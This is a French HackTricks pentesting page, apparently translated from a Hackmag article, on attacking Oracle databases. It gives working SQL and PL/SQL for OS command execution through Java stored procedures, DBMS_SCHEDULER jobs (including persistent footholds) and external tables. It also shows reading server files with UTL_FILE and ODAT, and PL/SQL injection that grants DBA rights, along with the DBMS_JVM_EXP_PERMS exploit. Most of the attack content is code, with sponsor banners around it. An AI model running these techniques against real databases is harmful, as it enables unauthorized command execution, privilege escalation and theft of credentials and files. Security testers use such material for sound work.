<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# RCE : Proc√©dure Stock√©e Java

Imaginez donc que vous ayez les informations du compte administrateur. Dans ce cas, une mani√®re tr√®s populaire d'ex√©cuter votre commande sur le serveur est d'√©crire une ‚Äòproc√©dure stock√©e java‚Äô. Cela se fait en trois √©tapes. Tout d'abord, cr√©ez une classe Java appel√©e ‚Äòoraexec‚Äô. Pour ce faire, connectez-vous via le terminal ‚Äòsqlplus‚Äô et √©crivez :
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
public static void execCommand(String command) throws IOException
{
Runtime.getRuntime().exec(command);
}
}
/

```
Ensuite, √©crivez un wrapper PL/SQL pour cette classe :
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
C'est tout. Maintenant, pour ex√©cuter une commande, il suffit d'envoyer la requ√™te suivante :
```text
exec javacmd('command');
```
Notez que lors de l'utilisation de la proc√©dure ci-dessus, nous ne pouvons pas voir les r√©sultats de la commande ex√©cut√©e, cependant, vous pouvez rediriger la sortie vers un fichier et le lire. Vous pouvez trouver le code complet du shell qui permet de lire et d'√©crire des fichiers :

{% file src="../../.gitbook/assets/raptor_oraexec.sql" %}

Cependant, il existe un \[script plus sophistiqu√©\] \(goo.gl/EuwPRU\) qui g√®re la sortie de la commande, mais il est plus volumineux [ici](https://oracle-base.com/articles/8i/shell-commands-from-plsql).

# RCE : Planificateur

La m√©thode suivante, qui nous aidera s'il n'y a pas de machine virtuelle Java, consiste √† utiliser 'dbmsscheduler', le planificateur de t√¢ches int√©gr√© d'Oracle. Pour l'utiliser, vous devez disposer du privil√®ge 'CREATE EXTERNAL JOB'. Voici un exemple de code qui impl√©mente l'entr√©e de la cha√Æne '0wned' dans un fichier texte √† la racine du lecteur C :
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);
```
Cela cr√©era et ex√©cutera un job pour ex√©cuter votre commande. Et voici une option pour appeler le planificateur √† partir d'une autre proc√©dure ‚Äì 'SYS.KUPP$PROC.CREATE_MASTER_PROCESS', qui nous int√©resse principalement, car elle vous permet d'int√©grer des requ√™tes multi-instructions, c'est-√†-dire celles compos√©es de plusieurs sous-requ√™tes. Th√©oriquement, vous pouvez ex√©cuter une telle requ√™te m√™me en cas d'injection dans une application web.
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
Notez que, lorsque vous utilisez le Scheduler, vous pouvez ex√©cuter cette t√¢che plus d'une fois et le faire avec une certaine fr√©quence. En cons√©quence, cela vous aidera √† obtenir un point d'ancrage dans le syst√®me test√©, car, m√™me si l'administrateur supprime l'utilisateur de l'OS, cette t√¢che, qui s'ex√©cute r√©guli√®rement dans le syst√®me, le ram√®nera √† la vie.

# RCE : Tables Externes

Comme derni√®re m√©thode pour r√©aliser l'ex√©cution de commandes OS, je voudrais mentionner l'utilisation de Tables Externes. Cette m√©thode vous aidera plus tard √† t√©l√©charger des fichiers depuis le serveur. Vous aurez besoin des privil√®ges suivants :

* UTL\_FILE;
* CREATE TABLE;
* un r√©pertoire r√©serv√© √† l'utilisateur.

Rappelons que l'acc√®s au package 'UTL\_FILE' est par d√©faut fourni √† tous les comptes avec le r√¥le 'CONNECT'. Premi√®re √©tape : V√©rifiez les r√©pertoires √©mis avec la requ√™te suivante :
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;

TABLE_NAME
------------------------------
ALICE_DIR
```
√âtape deux : Cr√©er un fichier batch ex√©cutable avec la commande souhait√©e :
```text
declare
f utl_file.file_type;
s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
f := utl_file.fopen('ALICE_DIR','test.bat','W');
utl_file.put_line(f,s);
utl_file.fclose(f);
end;
/
```
√âtape trois : Pr√©parez la table externe 'EXTT', vous en aurez besoin pour ex√©cuter le fichier :
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
DEFAULT DIRECTORY ALICE_DIR
ACCESS PARAMETERS
( RECORDS DELIMITED BY NEWLINE
FIELDS TERMINATED BY ',')
LOCATION (alice_dir:'test.bat'))
/
```
Maintenant, appelez simplement votre fichier batch avec la commande suivante :
```text
SELECT * from EXTT;
```
Le terminal commencera √† afficher des messages d'erreur indiquant que le syst√®me ne peut pas associer la table et le fichier invoqu√©, mais, dans ce cas, ce n'est pas important, car l'objectif principal √©tait d'ouvrir le fichier ex√©cutable, ce que vous avez r√©ussi.

L'utilitaire `ODAT.py` peut √©galement mettre en ≈ìuvre cette attaque. Cependant, il n√©cessite le privil√®ge `CREATE ANY DIRECTORY`, qui, par d√©faut, est accord√© uniquement au r√¥le DBA, car il tente d'ex√©cuter le fichier depuis n'importe quel r√©pertoire et pas seulement "votre" r√©pertoire.

# Lire/√âcrire des fichiers

Maintenant, passons √† la t√¢che de lire et d'√©crire des fichiers. Si vous avez simplement besoin de lire ou d'√©crire un fichier sur le serveur, vous pouvez le faire sans aucune proc√©dure Java, qui, cependant, peut √©galement g√©rer de telles t√¢ches. Examinons le package `UTL_FILE` qui poss√®de les fonctionnalit√©s requises pour travailler avec le syst√®me de fichiers. La bonne nouvelle est que, par d√©faut, il peut √™tre acc√©d√© par tous les utilisateurs avec le r√¥le `PUBLIC`. La mauvaise nouvelle est que, par d√©faut, cette proc√©dure n'a pas acc√®s √† l'ensemble du syst√®me de fichiers, mais seulement √† un r√©pertoire pr√©d√©fini par l'administrateur. Cependant, il n'est pas rare de trouver un param√®tre de r√©pertoire sp√©cifi√© comme `*`, ce qui signifie litt√©ralement "acc√®s √† tout". Vous pouvez le d√©couvrir en utilisant la commande suivante :
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
J'ai d√©couvert que la proc√©dure la plus courte pour utiliser le package ‚ÄòUTL\_FILE‚Äô est propos√©e par Alexander Polyakov :
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/‚Äô,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

```
Si vous avez besoin de plus de fonctionnalit√©s avec la capacit√© d'√©crire, je recommande de rechercher un script appel√© 'raptor_oraexec.sql'. Et selon la tradition, voici une option pour utiliser l'utilitaire 'ODAT', qui, comme toujours, est le plus court :
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
Le package 'UTL\_FILE' est √©galement tr√®s int√©ressant car, si vous avez de la chance, vous pouvez acc√©der aux journaux, fichiers de configuration et obtenir les mots de passe des comptes privil√©gi√©s, tels que 'SYS'.

La deuxi√®me m√©thode que je souhaite mentionner est d'utiliser √† nouveau les 'External Tables'. Rappelez-vous que, lors de l'utilisation des 'External Tables', la base de donn√©es peut acc√©der en mode lecture aux donn√©es des tables externes. Pour un hacker, cela signifie une autre opportunit√© de t√©l√©charger des fichiers depuis le serveur, mais cette m√©thode n√©cessite le privil√®ge 'CREATE ANY DIRECTORY'. Je sugg√®re d'utiliser imm√©diatement 'ODAT', car il est stable et rapide :
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# √âl√©vation de privil√®ges

Vous pouvez utiliser diverses m√©thodes pour √©lever les privil√®ges, allant des d√©bordements de tampon classiques et du patching de DLL aux attaques sp√©cialis√©es contre les bases de donn√©es, telles que les injections PL/SQL. Le sujet est tr√®s vaste et, dans cet article, je ne m'y attarderai pas, car cela est discut√© dans de grands travaux de recherche, tels que ceux trouv√©s dans les blogs de \[Lichfield\] \(goo.gl/IebQN4\) et \[Finnigan\] \(goo.gl/vXhttf\). Je vais juste en d√©montrer certains, afin que vous ayez une id√©e g√©n√©rale. Lors des tests, je recommande simplement de pr√™ter attention aux privil√®ges actuels et, sur cette base, de rechercher les failles souhait√©es sur Internet.

Contrairement √† MS SQL, o√π un attaquant peut injecter ‚Äòxp\_cmdshell‚Äô presque imm√©diatement apr√®s ‚ÄòSELECT‚Äô en le fermant simplement avec un guillemet, Oracle DB rejette cat√©goriquement de tels tours. Pour cette raison, nous ne pouvons pas toujours recourir aux injections SQL classiques bien que, dans ce cas aussi, il soit possible de trouver une solution. Nous consid√©rerons les injections PL/SQL, qui modifient le processus d'ex√©cution d'une proc√©dure \(fonction, d√©clencheur et autres objets\) en int√©grant des commandes al√©atoires dans les param√®tres d'entr√©e disponibles. \(—Å\) Sh2kerr

Afin d'int√©grer la charge utile, trouvez une fonction o√π les param√®tres d'entr√©e ne sont pas filtr√©s. Rappelez-vous qu'Oracle SQL ne permet pas les requ√™tes multi-d√©clarations \(multiples\), par cons√©quent, vous aurez probablement besoin d'utiliser certaines proc√©dures "sp√©ciales" qui ont cette fonctionnalit√©. L'id√©e principale derri√®re l'attaque est la suivante : Par d√©faut, √† moins qu'il en soit sp√©cifi√© autrement, la proc√©dure est ex√©cut√©e au nom du propri√©taire et non au nom de l'utilisateur qui l'a d√©marr√©e. En d'autres termes, si une proc√©dure appartenant au compte ‚ÄòSYS‚Äô est disponible pour l'ex√©cution et que vous pouvez int√©grer votre code dedans, votre charge utile sera √©galement ex√©cut√©e dans le contexte du compte ‚ÄòSYS‚Äô. Comme je l'ai d√©j√† mentionn√©, cela n'arrive pas toujours, car il y a des proc√©dures avec le param√®tre ‚Äòauthid current\_user‚Äô, ce qui signifie que cette proc√©dure sera ex√©cut√©e avec les privil√®ges de l'utilisateur actuel. Cependant, g√©n√©ralement dans chaque version, vous pouvez trouver certaines fonctions qui sont vuln√©rables √† l'injection PL/SQL. Une vue g√©n√©rale de ce processus est illustr√©e √† la Fig. 2.

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

En bref, au lieu d'un argument l√©gitime attendu, nous passons un code malveillant qui devient une partie de la proc√©dure. Un bon exemple est fourni par la fonction ‚ÄòCTXSYS.DRILOAD‚Äô. Elle est ex√©cut√©e au nom de ‚ÄòCTXSYS‚Äô et ne filtre pas le param√®tre d'entr√©e, ce qui vous permet de monter facilement au niveau DBA :
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
Cependant, √† l'heure actuelle, cela appartient probablement au pass√©, puisque la vuln√©rabilit√© a √©t√© d√©couverte en 2004, et elle n'affecte que les anciennes versions 8 √† 9. Habituellement, le processus d'escalade des privil√®ges se divise en deux parties : √©crire la proc√©dure qui augmente les droits et r√©aliser l'injection elle-m√™me. Une proc√©dure typique est la suivante :
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
Maintenant, nous pouvons injecter une proc√©dure en tant qu'argument de la fonction vuln√©rable \(exemple pour les versions 10x\) :
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 ‚Äì-');
```
Dans les versions pas si anciennes 10 et 11, il existe une "belle" exception, ou plut√¥t une vuln√©rabilit√©, qui permet d'ex√©cuter des commandes sur le serveur sans avoir les droits DBA : la proc√©dure 'DBMS\_JVM\_EXP\_PERMS' permet √† un utilisateur avec le privil√®ge 'CREATE SESSION' d'obtenir les droits 'JAVA IO'. L'attaque peut √™tre mont√©e comme suit :
```text
SQL&gt; DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/

PL/SQL procedure successfully completed.
```
Maintenant que vous avez les privil√®ges pour appeler des proc√©dures Java, vous pouvez invoquer une r√©ponse de l'interpr√©teur Windows et ex√©cuter quelque chose :
```text
SQL&gt; select dbms_java.runjava(‚Äòoracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack‚Äô)from dual;
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
